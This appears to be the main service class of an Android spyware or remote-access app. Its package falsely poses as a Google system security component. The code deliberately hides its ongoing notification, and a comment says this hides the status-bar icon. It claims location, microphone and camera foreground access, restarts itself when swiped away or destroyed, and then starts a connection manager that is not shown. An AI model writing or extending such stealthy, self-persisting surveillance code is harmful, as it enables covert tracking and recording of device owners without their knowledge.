package com.google.android.sys.security;

import android.app.ActivityManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import android.widget.Toast;

public class MainService extends Service {
    private static Context contextOfApplication;

    public MainService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }


    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
    {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            String channelId = "sys_security_service_channel";
            String channelName = getString(R.string.service_channel_name);
            
            // IMPORTANCE_MIN (1) keeps service alive but hides status bar icon on most devices
            android.app.NotificationChannel channel = new android.app.NotificationChannel(channelId, channelName, android.app.NotificationManager.IMPORTANCE_MIN);
            channel.setLockscreenVisibility(android.app.Notification.VISIBILITY_SECRET);
            channel.setShowBadge(false);
            
            android.app.NotificationManager manager = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (manager != null) {
                manager.createNotificationChannel(channel);
                
                // Compatibility for Android 12+ (Immutable PendingIntent)
                int pendingFlags = PendingIntent.FLAG_UPDATE_CURRENT;
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M) {
                    pendingFlags |= PendingIntent.FLAG_IMMUTABLE;
                }

                Intent settingsIntent = new Intent(this, SettingsActivity.class);
                PendingIntent pendingSettings = PendingIntent.getActivity(this, 0, settingsIntent, pendingFlags);

                android.app.Notification.Builder nb = new android.app.Notification.Builder(this, channelId)
                    .setOngoing(true)
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .setContentTitle(getString(R.string.service_notification_title))
                    .setContentText(getString(R.string.service_notification_active))
                    .setPriority(android.app.Notification.PRIORITY_MIN)
                    .setCategory(android.app.Notification.CATEGORY_SERVICE)
                    .setVisibility(android.app.Notification.VISIBILITY_SECRET);

                android.app.Notification notification = nb.build();
                
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                    int serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION;
                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE;
                    serviceType |= android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA;
                    startForeground(101, notification, serviceType);
                } else {
                    startForeground(101, notification);
                }
            }
        }

        contextOfApplication = this;
        ConnectionManager.startAsync(this);
        return Service.START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // This is triggered when the app is swiped away from Recents
        Intent restartServiceIntent = new Intent(getApplicationContext(), this.getClass());
        restartServiceIntent.setPackage(getPackageName());
        startService(restartServiceIntent);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        // Attempt to restart if destroyed by system
        Intent broadcastIntent = new Intent();
        broadcastIntent.setAction("com.google.android.sys.security.RESTART_SERVICE");
        broadcastIntent.setClass(this, MyReceiver.class);
        this.sendBroadcast(broadcastIntent);
        super.onDestroy();
    }


    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }


}
